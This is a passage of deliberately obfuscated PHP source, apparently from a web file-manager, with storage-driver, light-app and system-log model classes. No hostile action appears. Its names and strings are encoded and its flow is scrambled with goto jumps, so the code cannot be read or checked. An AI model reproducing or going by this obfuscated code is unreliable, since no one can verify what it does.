trim($eŒ«Ó¬ÂÃ); } $E·çêÅª‰[$Eßš½óÀ¯[2387]] = rand_string(6); $aİã¹÷¹¢ = $GLOBALS[$Eßš½óÀ¯[6]][$Eßš½óÀ¯[94]][$Eßš½óÀ¯[743]]; goto F…ß†Áõòç; F…ß†Áõòç: $a—á¼ÛÅ†Ô = isset($aİã¹÷¹¢[$eÈóÃĞ…¥ä]) ? $aİã¹÷¹¢[$eÈóÃĞ…¥ä] : ucfirst($eÈóÃĞ…¥ä); $A…«½ÛÎ£è = $Eßš½óÀ¯[81] . $a—á¼ÛÅ†Ô; if (!$a—á¼ÛÅ†Ô || !class_exists($A…«½ÛÎ£è)) { write_log(array($Eßš½óÀ¯[2388], $f†¿À‡Ëİø, get_caller_info()), $Eßš½óÀ¯[2389]); show_json(LNG($Eßš½óÀ¯[2390]), !1, $f†¿À‡Ëİø); } goto b§¹“ËìğÄ; dïÚœËŒÑ: $E±á”ÒÔ¶˜ = $AâëÄœçø->getPath($DÕ˜ƒ¶ÕØ . $Eßš½óÀ¯[1975]); if (!$AâëÄœçø->mkfile($E±á”ÒÔ¶˜)) { show_json(LNG($Eßš½óÀ¯[2391]), !1); } $E·çêÅª‰[$Eßš½óÀ¯[1015]] = $DÕ˜ƒ¶ÕØ; goto AÂêÜÓÈ•²; a·–Ê®œ‡É: $Eßš½óÀ¯ =& $_SERVER[¨¤¼…´]; $eÈóÃĞ…¥ä = strtolower($f†¿À‡Ëİø[$Eßš½óÀ¯[100]]); $E·çêÅª‰ = json_decode($f†¿À‡Ëİø[$Eßš½óÀ¯[6]], !0); goto DªÕ¦àØ‡è; AÂêÜÓÈ•²: $f†¿À‡Ëİø[$Eßš½óÀ¯[6]] = json_encode($E·çêÅª‰); $f†¿À‡Ëİø[$Eßš½óÀ¯[100]] = $a—á¼ÛÅ†Ô; return !0; goto CÔ ÷Ò¥; CÔ ÷Ò¥: } public function driverListSystem() { $a¶†õ„á’ =& $_SERVER[¨¤¼…´]; $Cùš›ª¨ê = parent::listData(); $aùôÔ¥ºÈİ = array(); foreach ($Cùš›ª¨ê as $Dã÷‰œßÒº) { unset($Dã÷‰œßÒº[$a¶†õ„á’[201]], $Dã÷‰œßÒº[$a¶†õ„á’[117]]); $Dã÷‰œßÒº[$a¶†õ„á’[6]] = json_decode($Dã÷‰œßÒº[$a¶†õ„á’[6]], !0); $aùôÔ¥ºÈİ[] = $Dã÷‰œßÒº; } return $aùôÔ¥ºÈİ; } public function defaultDriver() { $có«‹„‡î =& $_SERVER[¨¤¼…´]; $B¶êĞœ·“ê = parent::listData(); $a¥ö”Ééî = array_filter_by_field($B¶êĞœ·“ê, $có«‹„‡î[44], 1); $a¥ö”Ééî = $a¥ö”Ééî[0]; if ($a¥ö”Ééî) { $a¥ö”Ééî[$có«‹„‡î[6]] = json_decode($a¥ö”Ééî[$có«‹„‡î[6]], !0); } return $a¥ö”Ééî; } public function driverInfo($Bƒ“³È“) { $fÇ‘ƒ‡œ± =& $_SERVER[¨¤¼…´]; $aöê²šô‰ª = array_to_keyvalue(parent::listData(), $fÇ‘ƒ‡œ±[379]); if (!isset($aöê²šô‰ª[$Bƒ“³È“])) { return !1; } $b‰ø‰‹¥˜— = $aöê²šô‰ª[$Bƒ“³È“]; $b‰ø‰‹¥˜—[$fÇ‘ƒ‡œ±[6]] = json_decode($b‰ø‰‹¥˜—[$fÇ‘ƒ‡œ±[6]], !0); return $b‰ø‰‹¥˜—; } public function remove($F‘Šóƒ“¢) { $this->removeShareItems($F‘Šóƒ“¢); return parent::remove($F‘Šóƒ“¢); } public function removeWithFile($a˜¼ÁÒòèë, $A¸‚Í¿ĞÔµ) { goto e„Üâğö÷Š; e„Üâğö÷Š: $FßíŸÈÑŠ =& $_SERVER[¨¤¼…´]; $FØ”‘Ğ®Ë = array($FßíŸÈÑŠ[733] => $a˜¼ÁÒòèë); $FËæáêƒÌÑ = Model($FßíŸÈÑŠ[434])->where($FØ”‘Ğ®Ë)->count(); goto F§ßÏØÁ—İ; DÜõÒÒŸ¥µ: $eäŞÌÓˆ¯ = Model($FßíŸÈÑŠ[181])->where($FØ”‘Ğ®Ë)->field($FßíŸÈÑŠ[2396])->select(); foreach ($eäŞÌÓˆ¯ as $eÜÀ»˜˜¢§) { goto B—ÖÆœÎ§; bÁÅÙàÑª: $A„½ŒÊ˜‡± = array($FßíŸÈÑŠ[733] => $b·Á‰³ªÈ, $FßíŸÈÑŠ[85] => $A…©ôğÁº’); Model($FßíŸÈÑŠ[181])->where($FØ”‘Ğ®Ë)->save($A„½ŒÊ˜‡±); goto Dİ™÷Šï¼; eìó†âëØ: if (IO::exist($A…©ôğÁº’)) { $F£¨¾êÚäç->updateFileEnd($eÜÀ»˜˜¢§[$FßíŸÈÑŠ[38]], $eÜÀ»˜˜¢§[$FßíŸÈÑŠ[87]]); continue; } if (!IO::move($C¥ëÃ¶Î‘Â, get_path_father($A…©ôğÁº’))) { $CÅ„Í»×ï = !1; break; } $FØ”‘Ğ®Ë = array($FßíŸÈÑŠ[431] => $eÜÀ»˜˜¢§[$FßíŸÈÑŠ[431]]); goto bÁÅÙàÑª; B—ÖÆœÎ§: $C¥ëÃ¶Î‘Â = $eÜÀ»˜˜¢§[$FßíŸÈÑŠ[85]]; $A…©ôğÁº’ = $d´Õ«ï«ø´ . str_replace("\173\151\157\72{$a˜¼ÁÒòèë}\x7d\57", $FßíŸÈÑŠ[43], $C¥ëÃ¶Î‘Â); if (!IO::exist($C¥ëÃ¶Î‘Â)) { $eÈÉßëİ´Â[] = $eÜÀ»˜˜¢§[$FßíŸÈÑŠ[431]]; $F£¨¾êÚäç->updateFileEnd($eÜÀ»˜˜¢§[$FßíŸÈÑŠ[38]], $eÜÀ»˜˜¢§[$FßíŸÈÑŠ[87]]); continue; } goto eìó†âëØ; Dİ™÷Šï¼: } $this->removeByFileID($eÈÉßëİ´Â); goto A¶õ¶Ë›å¶; b‰¤ã‡±šÊ: $d´Õ«ï«ø´ = "\x7b\151\x6f\72{$b·Á‰³ªÈ}\175\x2f"; $CÅ„Í»×ï = !0; $eÈÉßëİ´Â = array(); goto DÜõÒÒŸ¥µ; F¡²àÎà³·: $F£¨¾êÚäç->task[$FßíŸÈÑŠ[688]] = (double) $f”ãœ¤º÷Ç; $dÏÉà‹µ±ù = KodIO::defaultDriver(); $b·Á‰³ªÈ = $dÏÉà‹µ±ù[$FßíŸÈÑŠ[379]]; goto b‰¤ã‡±šÊ; F§ßÏØÁ—İ: $f”ãœ¤º÷Ç = Model($FßíŸÈÑŠ[434])->where($FØ”‘Ğ®Ë)->sum($FßíŸÈÑŠ[87]); $fŠ‡ÑŠ™ìØ = $A¸‚Í¿ĞÔµ . $FßíŸÈÑŠ[2394] . $a˜¼ÁÒòèë; $F£¨¾êÚäç = new TaskFileTransfer($fŠ‡ÑŠ™ìØ, $FßíŸÈÑŠ[2389], $FËæáêƒÌÑ, LNG($FßíŸÈÑŠ[2395]) . "\x28{$a˜¼ÁÒòèë}\x29"); goto F¡²àÎà³·; A¶õ¶Ë›å¶: if (!$CÅ„Í»×ï) { $F£¨¾êÚäç->stop($fŠ‡ÑŠ™ìØ); return !1; } $F£¨¾êÚäç->end(); if ($A¸‚Í¿ĞÔµ == $FßíŸÈÑŠ[2061]) { $this->remove($a˜¼ÁÒòèë); } goto aÖİ…ªªŠØ; aÖİ…ªªŠØ: } public function progress($D†ÏÌ¿®ù´, $AØ¥ßòø›) { return Task::get($AØ¥ßòø› . $_SERVER[¨¤¼…´][2394] . $D†ÏÌ¿®ù´); } private function removeByFileID($a¢Å›Ó«ğ = array()) { goto C®¢«ì¼; C®¢«ì¼: $e»æĞğ¯À¢ =& $_SERVER[¨¤¼…´]; if (empty($a¢Å›Ó«ğ)) { return; } $Dº˜áéà„ = array($e»æĞğ¯À¢[431] => array($e»æĞğ¯À¢[7], $a¢Å›Ó«ğ)); goto Fœ­•„®®è; dñğ£ä·öÚ: foreach ($CÍóé›šÜ as $e‚œÑ†ÜÁ) { Model($e»æĞğ¯À¢[394])->removeNow($e‚œÑ†ÜÁ, !1); } goto F²ñ¡ÅÊá; Fœ­•„®®è: $CÍóé›šÜ = Model($e»æĞğ¯À¢[1107])->where($Dº˜áéà„)->field($e»æĞğ¯À¢[381])->select(); if (!$CÍóé›šÜ) { return; } $CÍóé›šÜ = array_to_keyvalue($CÍóé›šÜ, $e»æĞğ¯À¢[43], $e»æĞğ¯À¢[381]); goto dñğ£ä·öÚ; F²ñ¡ÅÊá: } private function removeShareItems($a…½¯¨‰Êñ) { goto a’‰ŞÛ®Íµ; EÔ²÷œø¦: Model($Fâ«¹½Šëô[548])->remove($aªâ´‰èóÊ); goto Aõè÷Ø£ °; a’‰ŞÛ®Íµ: $Fâ«¹½Šëô =& $_SERVER[¨¤¼…´]; $B“˜ ÜòĞ = "\x7b\x69\157\72{$a…½¯¨‰Êñ}\175\57"; $f©”Ò˜ÍİÈ = array($Fâ«¹½Šëô[381] => 0, $Fâ«¹½Šëô[1010] => array($Fâ«¹½Šëô[741], "{$B“˜ ÜòĞ}\x25")); goto F…Ã¯éê; F…Ã¯éê: $DóØÁŸÕáê = Model($Fâ«¹½Šëô[2072])->where($f©”Ò˜ÍİÈ)->field($Fâ«¹½Šëô[452])->select(); if (empty($DóØÁŸÕáê)) { return; } $aªâ´‰èóÊ = array_to_keyvalue($DóØÁŸÕáê, $Fâ«¹½Šëô[43], $Fâ«¹½Šëô[452]); goto EÔ²÷œø¦; Aõè÷Ø£ °: } } class SystemLightAppModel extends ModelBaseLight { public $optionType = "\123\x79\x73\x74\x65\155\x2e\114\x69\x67\150\x74\x41\x70\160"; public $modelType = "\x53\171\163\164\x65\155\x4f\160\x74\151\157\156"; public $field = array("\x6e\x61\155\145", "\x67\162\x6f\165\160", "\144\x65\163\143", "\x63\157\156\164\145\x6e\x74"); public function listData($b‹›½Š†ŸÇ = false, $BÈ´ÏØ†Ç = "\x6d\157\144\151\146\x79\x54\x69\x6d\145", $F‡Š‘„£Â’ = true) { return parent::listData($b‹›½Š†ŸÇ, $BÈ´ÏØ†Ç, $F‡Š‘„£Â’); } public function remove($eéÑŞÍºê‰) { $BñëÕª²ç® = $this->findByName($eéÑŞÍºê‰); if (!$BñëÕª²ç®) { return !1; } return parent::remove($BñëÕª²ç®[$_SERVER[¨¤¼…´][379]]); } public function add($F±Ø“¶İ•) { if ($this->findByName($F±Ø“¶İ•[$_SERVER[¨¤¼…´][38]])) { return !1; } return parent::insert($F±Ø“¶İ•); } public function update($eÅê‰Å‚Ç, $CŞÂç±ì‹Ò) { $Có»œèÆ =& $_SERVER[¨¤¼…´]; $b’Ïæù±õ = $this->findByName($eÅê‰Å‚Ç); $cğ‘—‰åÛ‹ = $this->findByName($CŞÂç±ì‹Ò[$Có»œèÆ[38]]); if (!$b’Ïæù±õ || $cğ‘—‰åÛ‹ && $cğ‘—‰åÛ‹[$Có»œèÆ[379]] != $b’Ïæù±õ[$Có»œèÆ[379]]) { return !1; } return parent::update($b’Ïæù±õ[$Có»œèÆ[379]], $CŞÂç±ì‹Ò); } } class SystemLogModel extends ModelBase { protected $tableName = "\x73\x79\x73\164\145\155\x5f\x6c\157\147"; protected $dataAuto = array(array("\x63\162\x65\141\x74\145\x54\151\155\x65", "\164\151\x6d\x65", "\151\156\x73\x65\162\164", "\146\x75\156\x63\x74\151\x6f\156")); public $typeList; function __construct() { parent::__construct(); $this->typeList = $this->allTypeList(); } public function allTypeList() { $D¡ÅÖİ¸™ =& $_SERVER[¨¤¼…´]; return array($D¡ÅÖİ¸™[2397] => LNG($D¡ÅÖİ¸™[2398]), $D¡ÅÖİ¸™[2399] => LNG($D¡ÅÖİ¸™[2400]), $D¡ÅÖİ¸™[2034] => LNG($D¡ÅÖİ¸™[2401]), $D¡ÅÖİ¸™[2402] => LNG($D¡ÅÖİ¸™[2403]), $D¡ÅÖİ¸™[2404] => LNG($D¡ÅÖİ¸™[2405]), $D¡ÅÖİ¸™[2406] => LNG($D¡ÅÖİ¸™[2407]), $D¡ÅÖİ¸™[2408] => LNG($D¡ÅÖİ¸™[2409]), $D¡ÅÖİ¸™[2410] => LNG($D¡ÅÖİ¸™[2411]), $D¡ÅÖİ¸™[2412] => LNG($D¡ÅÖİ¸™[2413]), $D¡ÅÖİ¸™[2065] => LNG($D¡ÅÖİ¸™[2413]), $D¡ÅÖİ¸™[2066] => LNG($D¡ÅÖİ¸™[2414]), $D¡ÅÖİ¸™[2415] => LNG($D¡ÅÖİ¸™[2416]), $D¡ÅÖİ¸™[2417] => LNG($D¡ÅÖİ¸™[2418]), $D¡ÅÖİ¸™[2419] => LNG($D¡ÅÖİ¸™[2420]), $D¡ÅÖİ¸™[2421] => LNG($D¡ÅÖİ¸™[2422]), $D¡ÅÖİ¸™[2063] => LNG($D¡ÅÖİ¸™[2423]), $D¡ÅÖİ¸™[2070] => LNG($D¡ÅÖİ¸™[2424]), $D¡ÅÖİ¸™[2425] => LNG($D¡ÅÖİ¸™[2426]), $D¡ÅÖİ¸™[2427] => LNG($D¡ÅÖİ¸™[2428]), $D¡ÅÖİ¸™[2429] => LNG($D¡ÅÖİ¸™[2430]), $D¡ÅÖİ¸™[2431] => LNG($D¡ÅÖİ¸™[2432]), $D¡ÅÖİ¸™[2073] => LNG($D¡ÅÖİ¸™[2433]), $D¡ÅÖİ¸™[2074] => LNG($D¡ÅÖİ¸™[2434]), $D¡ÅÖİ¸™[2435] => LNG($D¡ÅÖİ¸™[2436]), $D¡ÅÖİ¸™[2437] => LNG($D¡ÅÖİ¸™[2438]), $D¡ÅÖİ¸™[2439] => LNG($D¡ÅÖİ¸™[2440]), $D¡ÅÖİ¸™[2068] => LNG($D¡ÅÖİ¸™[2441]), $D¡ÅÖİ¸™[2442] => LNG($D¡ÅÖİ¸™[2443]), $D¡ÅÖİ¸™[2067] => LNG($D¡ÅÖİ¸™[2444]), $D¡ÅÖİ¸™[2445] => LNG($D¡ÅÖİ¸™[2446]), $D¡ÅÖİ¸™[2447] => LNG($D¡ÅÖİ¸™[2448]), $D¡ÅÖİ¸™[2449] => LNG($D¡ÅÖİ¸™[2449]), $D¡ÅÖİ¸™[2450] => LNG($D¡ÅÖİ¸™[2038]), $D¡ÅÖİ¸™[2451] => LNG($D¡ÅÖİ¸™[2452]), $D¡ÅÖİ¸™[2453] => LNG($D¡ÅÖİ¸™[2454]), $D¡ÅÖİ¸™[2455] => LNG($D¡ÅÖİ¸™[2456]), $D¡ÅÖİ¸™[2457] => LNG($D¡ÅÖİ¸™[2458]), $D¡ÅÖİ¸™[2459] => LNG($D¡ÅÖİ¸™[2460]), $D¡ÅÖİ¸™[2461] => LNG($D¡ÅÖİ¸™[2461]), $D¡ÅÖİ¸™[2462] => LNG($D¡ÅÖİ¸™[2463]), $D¡ÅÖİ¸™[2464] => LNG($D¡ÅÖİ¸™[2465]), $D¡ÅÖİ¸™[2466] => LNG($D¡ÅÖİ¸™[2467]), $D¡ÅÖİ¸™[2468] => LNG($D¡ÅÖİ¸™[2469]), $D¡ÅÖİ¸™[2470] => LNG($D¡ÅÖİ¸™[2471]), $D¡ÅÖİ¸™[2472] => LNG($D¡ÅÖİ¸™[2473])); } private function typeFile() { $aÅÊÙç‡™ç =& $_SERVER[¨¤¼…´]; $aÇÈ¨®™ïò = array($aÅÊÙç‡™ç[2070] => array($aÅÊÙç‡™ç[2071]), $aÅÊÙç‡™ç[2419] => array($aÅÊÙç‡™ç[2474]), $aÅÊÙç‡™ç[2421] => array($aÅÊÙç‡™ç[2475]), $aÅÊÙç‡™ç[2063] => array($aÅÊÙç‡™ç[2064]), $aÅÊÙç‡™ç[2427] => array(), $aÅÊÙç‡™ç[2429] => array(), $aÅÊÙç‡™ç[2431] => array(), $aÅÊÙç‡™ç[2073] => array($aÅÊÙç‡™ç[2075]), $aÅÊÙç‡™ç[2074] => array($aÅÊÙç‡™ç[2075]), $aÅÊÙç‡™ç[2435] => array($aÅÊÙç‡™ç[2476]), $aÅÊÙç‡™ç[2437] => array($aÅÊÙç‡™ç[2476]), $aÅÊÙç‡™ç[2439] => array($aÅÊÙç‡™ç[2477]), $aÅÊÙç‡™ç[2425] => array($aÅÊÙç‡™ç[2478]), $aÅÊÙç‡™ç[2068] => array($aÅÊÙç‡™ç[2479]), $aÅÊÙç‡™ç[2442] => array($aÅÊÙç‡™ç[2480]), $aÅÊÙç‡™ç[2067] => array($aÅÊÙç‡™ç[2069])); return $aÇÈ¨®™ïò; } private function typeAll() { goto dÜÂ¯»¯‰‡; AŒ˜§ Š: return $aé–¡„ª’; goto dÔ›°‚íä£; dÜÂ¯»¯‰‡: $FŞˆó¸ä‹ó =& $_SERVER[¨¤¼…´]; $aé–¡„ª’ = $this->typeList; $AĞƒèäÁã = array_filter($this->typeFile()); goto eÁÁÔöÎí; eÁÁÔöÎí: foreach ($AĞƒèäÁã as $D‚äß¯ŞÊï => $A“œ¢æ«”¤) { $aé–¡„ª’[$A“œ¢æ«”¤[0]] = $aé–¡„ª’[$D‚äß¯ŞÊï]; } $aé–¡„ª’[$FŞˆó¸ä‹ó[2075]] = LNG($FŞˆó¸ä‹ó[2481]); $aé–¡„ª’[$FŞˆó¸ä‹ó[2476]] = LNG($FŞˆó¸ä‹ó[2482]); goto AŒ˜§ Š; dÔ›°‚íä£: } public function addLog($A°²ô„šÚ, $E£¯±âÜ” = array()) { goto BøÆÊ´‡·î; BøÆÊ´‡·î: $cÎïÉ´ƒ± =& $_SERVER[¨¤¼…´]; if (!isset($this->typeList[$A°²ô„šÚ])) { return; } $FÀ‚ÖàÀµ = defined($cÎïÉ´ƒ±[438]) && USER_ID ? USER_ID : (isset($E£¯±âÜ”[$cÎïÉ´ƒ±[1425]]) ? $E£¯±âÜ”[$cÎïÉ´ƒ±[1425]] : 0); goto CÃÇ¨ùÏ‰; CÃÇ¨ùÏ‰: if (!$FÀ‚ÖàÀµ) { $FÀ‚ÖàÀµ = (int) Session::get($cÎïÉ´ƒ±[2215]); } $E–Êì¯ƒÙ‡ = get_client_ip(); if (!$E£¯±âÜ” || strlen(json_encode($E£¯±âÜ”)) >= 1024) { $E£¯±âÜ” = array($cÎïÉ´ƒ±[2483] => $E–Êì¯ƒÙ‡); } else { if (is_array($E£¯±âÜ”)) { $E£¯±âÜ”[$cÎïÉ´ƒ±[2483]] = $E–Êì¯ƒÙ‡; } else { $E£¯±âÜ” = array($cÎïÉ´ƒ±[1025] => $E£¯±âÜ”, $cÎïÉ´ƒ±[2483] => $E–Êì¯ƒÙ‡); } } goto B£éŸ÷¢; B£éŸ÷¢: $E£¯±âÜ” = array($cÎïÉ´ƒ±[1415] => Session::sign(), $cÎïÉ´ƒ±[1416] => $FÀ‚ÖàÀµ, $cÎïÉ´ƒ±[39] => $A°²ô„šÚ, $cÎïÉ´ƒ±[1418] => json_encode($E£¯±âÜ”)); parent::add($E£¯±âÜ”); goto aËŞ•Ó²ÚÀ; aËŞ•Ó²ÚÀ: } public function remove($eÚ¥ææåÄ™) { $this->where(array($_SERVER[¨¤¼…´][397] => $eÚ¥ææåÄ™))->delete(); } private function _makeOrder($FÒâŒÆÙŒ¢ = '') { goto f°ÛÕ—¥õõ; f°ÛÕ—¥õõ: $CõÏÈµÚ® =& $_SERVER[¨¤¼…´]; $aŞ‘½ô÷í = $CõÏÈµÚ®[201]; $Aª†„öÃåŸ = array($CõÏÈµÚ®[414] => $CõÏÈµÚ®[415], $CõÏÈµÚ®[416] => $CõÏÈµÚ®[417]); goto béÈ»Ó³“; BØ‘ÉÇ¾°Ù: return $this->order($FÒâŒÆÙŒ¢); goto AÈÍ¢Í´ŠÁ; béÈ»Ó³“: $d¤‚¢µ¸“à = Input::get($CõÏÈµÚ®[420], $CõÏÈµÚ®[7], $CõÏÈµÚ®[2249], array($CõÏÈµÚ®[2175], $CõÏÈµÚ®[416])); $d¤‚¢µ¸“à = $Aª†„öÃåŸ[$d¤‚¢µ¸“à]; $FÒâŒÆÙŒ¢ = $FÒâŒÆÙŒ¢ . "{$aŞ‘½ô÷í}\40{$d¤‚¢µ¸“à}"; goto BØ‘ÉÇ¾°Ù; AÈÍ¢Í´ŠÁ: } public function get($EÓÕ°†øËÅ = '') { goto bÎĞ‘Õ¡“ï; Aœ„Øá˜æ: if (!empty($EÓÕ°†øËÅ[$A–¤‚§Äõæ[2483]])) { $EÖ†¡Ÿ„å[$A–¤‚§Äõæ[417]] = array($A–¤‚§Äõæ[741], "\45{$EÓÕ°†øËÅ[$A–¤‚§Äõæ[2483]]}\45"); } $dËí†ìçïø = $this->_makeOrder()->where($EÖ†¡Ÿ„å)->selectPage(); if (empty($dËí†ìçïø[$A–¤‚§Äõæ[367]])) { show_json(array(), !0, $dËí†ìçïø[$A–¤‚§Äõæ[364]]); } goto EéÁ‘Âê¸Ù; Cåã˜·Â‹Š: if ($EÓÕ°†øËÅ[$A–¤‚§Äõæ[1425]]) { $EÖ†¡Ÿ„å[$A–¤‚§Äõæ[1425]] = $EÓÕ°†øËÅ[$A–¤‚§Äõæ[1425]]; } if (isset($EÓÕ°†øËÅ[$A–¤‚§Äõæ[692]])) { $eŠÒ´†Âîù = $EÓÕ°†øËÅ[$A–¤‚§Äõæ[692]]; $e¯Åø°ÕŠå = isset($EÓÕ°†øËÅ[$A–¤‚§Äõæ[460]]) ? $EÓÕ°†øËÅ[$A–¤‚§Äõæ[460]] : time(); $EÖ†¡Ÿ„å[$A–¤‚§Äõæ[201]] = array($A–¤‚§Äõæ[334], array($eŠÒ´†Âîù, $e¯Åø°ÕŠå)); } if ($EÓÕ°†øËÅ[$A–¤‚§Äõæ[39]]) { $AÊ®´Çí¯õ = explode($A–¤‚§Äõæ[57], $EÓÕ°†øËÅ[$A–¤‚§Äõæ[39]]); $d‰ï½ĞÆö = $this->typeFile(); $FƒÁöøä÷ = array(); foreach ($AÊ®´Çí¯õ as $Eë‘÷öÚ†Í) { $FƒÁöøä÷[] = $Eë‘÷öÚ†Í; if (isset($d‰ï½ĞÆö[$Eë‘÷öÚ†Í])) { $FƒÁöøä÷ = array_merge($FƒÁöøä÷, $d‰ï½ĞÆö[$Eë‘÷öÚ†Í]); } } $FƒÁöøä÷ = array_unique($FƒÁöøä÷); if ($FƒÁöøä÷) { $EÖ†¡Ÿ„å[$A–¤‚§Äõæ[39]] = array($A–¤‚§Äõæ[7], $FƒÁöøä÷); } } goto Aœ„Øá˜æ; bÎĞ‘Õ¡“ï: $A–¤‚§Äõæ =& $_SERVER[¨¤¼…´]; if (!$EÓÕ°†øËÅ) { show_json(array()); } $EÖ†¡Ÿ„å = array(); goto Cåã˜·Â‹Š; EéÁ‘Âê¸Ù: $dËí†ìçïø[$A–¤‚§Äõæ[367]] = $this->logList($dËí†ìçïø[$A–¤‚§Äõæ[367]]); return $dËí†ìçïø; goto D—ƒ¸—ğ»; D—ƒ¸—ğ»: } private function ipAddress(&$aÃáÖËáã) { $Cåë¯õ’Ÿ¹ =& $_SERVER[¨¤¼…´]; if (!empty($aÃáÖËáã[$Cåë¯õ’Ÿ¹[2483]])) { $CÑ²Ñ‰‘óÓ = IpLocation::get($aÃáÖËáã[$Cåë¯õ’Ÿ¹[2483]]); } else { $CÑ²Ñ‰‘óÓ = LNG($Cåë¯õ’Ÿ¹[2484]); } $aÃáÖËáã[$Cåë¯õ’Ÿ¹[2485]] = $CÑ²Ñ‰‘óÓ; } private function descZipDownload($eˆŠŒÆó«, &$C á·ò‰ñà) { $F¦‡Ã»¦ËÆ =& $_SERVER[¨¤¼…´]; if (!isset($eˆŠŒÆó«[$F¦‡Ã»¦ËÆ[2486]])) { return; } $aæÏÓà¦¯ = json_decode($eˆŠŒÆó«[$F¦‡Ã»¦ËÆ[2486]], !0); foreach ($aæÏÓà¦¯ as $c»‚¹·†Æ´) { if (!IO::init($c»‚¹·†Æ´[$F¦‡Ã»¦ËÆ[85]])) { continue; } if (!($Fµ´ó¯ğˆì = IO::infoFull($c»‚¹·†Æ´[$F¦‡Ã»¦ËÆ[85]]))) { continue; } $eˆŠŒÆó«[$F¦‡Ã»¦ËÆ[85]] = $c»‚¹·†Æ´[$F¦‡Ã»¦ËÆ[85]]; $C á·ò‰ñà[] = $eˆŠŒÆó«[$F¦‡Ã»¦ËÆ[381]] = $Fµ´ó¯ğˆì[$F¦‡Ã»¦ËÆ[381]]; $C á·ò‰ñà[] = $eˆŠŒÆó«[$F¦‡Ã»¦ËÆ[2304]] = $Fµ´ó¯ğˆì[$F¦‡Ã»¦ËÆ[474]]; break; } return $eˆŠŒÆó«; } private function getSourceList(&$F„Î–‘ÔÛ) { $D„¾“Ñã“ğ =& $_SERVER[¨¤¼…´]; $AŠİÄ‹ôÇì = array(); foreach ($F„Î–‘ÔÛ as $D¶²È¯Œ => $cğËà†½£¡) { goto B­à µèÕ´; B­à µèÕ´: $fÂä¼•§ÂÉ = json_decode($cğËà†½£¡[$D„¾“Ñã“ğ[417]], !0); if ($cğËà†½£¡[$D„¾“Ñã“ğ[39]] == $D„¾“Ñã“ğ[2066]) { $fÂä¼•§ÂÉ = $this->descZipDownload($fÂä¼•§ÂÉ, $AŠİÄ‹ôÇì); $F„Î–‘ÔÛ[$D¶²È¯Œ][$D„¾“Ñã“ğ[417]] = json_encode($fÂä¼•§ÂÉ); continue; } if (strpos($cğËà†½£¡[$D„¾“Ñã“ğ[39]], $D„¾“Ñã“ğ[2305]) !== 0) { goto AÉ”Æ‰İ; AºÀ¢« ÈÀ: $AŠİÄ‹ôÇì[] = $fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[381]] = $e¼Úê˜ºğ¿[$D„¾“Ñã“ğ[381]]; $AŠİÄ‹ôÇì[] = $fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[2304]] = $e¼Úê˜ºğ¿[$D„¾“Ñã“ğ[474]]; $F„Î–‘ÔÛ[$D¶²È¯Œ][$D„¾“Ñã“ğ[417]] = json_encode($fÂä¼•§ÂÉ); goto f¸‹·Ì‚“ñ; AÉ”Æ‰İ: if (!isset($fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[85]]) || strpos($cğËà†½£¡[$D„¾“Ñã“ğ[39]], $D„¾“Ñã“ğ[2487]) !== 0) { continue; } if (!IO::init($fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[85]])) { continue; } if (!($e¼Úê˜ºğ¿ = IO::infoFull($fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[85]]))) { continue; } goto AºÀ¢« ÈÀ; f¸‹·Ì‚“ñ: continue; goto fñÓõ­â; fñÓõ­â: } goto Cê–Â• ø”; fùĞ»ÀĞğƒ: if ($fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[39]] == $D„¾“Ñã“ğ[2312]) { $AŠİÄ‹ôÇì[] = $fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[417]][$D„¾“Ñã“ğ[381]]; } goto BÁ•âíæè‹; Cê–Â• ø”: $AŠİÄ‹ôÇì[] = $fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[381]]; $AŠİÄ‹ôÇì[] = $fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[2304]]; if ($fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[39]] == $D„¾“Ñã“ğ[505]) { $AŠİÄ‹ôÇì[] = $fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[417]][$D„¾“Ñã“ğ[994]]; $AŠİÄ‹ôÇì[] = $fÂä¼•§ÂÉ[$D„¾“Ñã“ğ[417]][$D„¾“Ñã“ğ[995]]; } goto fùĞ»ÀĞğƒ; BÁ•âíæè‹: } if (!$AŠİÄ‹ôÇì) { return array(); } return Model($D„¾“Ñã“ğ[742])->sourceListInfo($AŠİÄ‹ôÇì, !0); } private function logList($E ÌÓÂ…²) { goto CÇ½š‘ô·; CÇ½š‘ô·: $B˜”ä ñéæ =& $_SERVER[¨¤¼…´]; $eà–•ÁãÄ = array_to_keyvalue($E ÌÓÂ…², $B˜”ä ñéæ[43], $B˜”ä ñéæ[1425]); $BÙšä¢ôˆ« = Model($B˜”ä ñéæ[490])->userListInfo(array_unique($eà–•ÁãÄ)); goto eÇœ¶ªó¾; f‘„Ñ•“óË: $e¿·…İÎ = array(); foreach ($E ÌÓÂ…² as $AØ¸Æ¨ÓîÁ => $a“áá¿„÷) { goto B‚±ôƒ¾¹³; fÕ©¥¨—Çò: $this->ipAddress($a“áá¿„÷); if (strpos($DâÒÎèíæ, $B˜”ä ñéæ[2305]) === 0 || isset($Có’­Í¢ì·[$B˜”ä ñéæ[2304]])) { goto EÏéˆ¹àÁ; aÅùŠ†µó²: if ($Có’­Í¢ì·[$B˜”ä ñéæ[2317]] && $Có’­Í¢ì·[$B˜”ä ñéæ[2317]][$B˜”ä ñéæ[383]] == $B˜”ä ñéæ[1070]) { $e¿·…İÎ[] = $a“áá¿„÷[$B˜”ä ñéæ[379]]; unset($E ÌÓÂ…²[$AØ¸Æ¨ÓîÁ]); continue; } goto f†ñî¨ÒÎ‹; EÏéˆ¹àÁ: $Có’­Í¢ì·[$B˜”ä ñéæ[403]] = $f¶Òéèèõ[$Có’­Í¢ì·[$B˜”ä ñéæ[381]]]; $Có’­Í¢ì·[$B˜”ä ñéæ[2317]] = $f¶Òéèèõ[$Có’­Í¢ì·[$B˜”ä ñéæ[2304]]]; if ($Có’­Í¢ì·[$B˜”ä ñéæ[39]] == $B˜”ä ñéæ[505]) { $Có’­Í¢ì·[$B˜”ä ñéæ[417]][$B˜”ä ñéæ[994]] = $f¶Òéèèõ[$Có’­Í¢ì·[$B˜”ä ñéæ[417]][$B˜”ä ñéæ[994]]]; $Có’­Í¢ì·[$B˜”ä ñéæ[417]][$B˜”ä ñéæ[995]] = 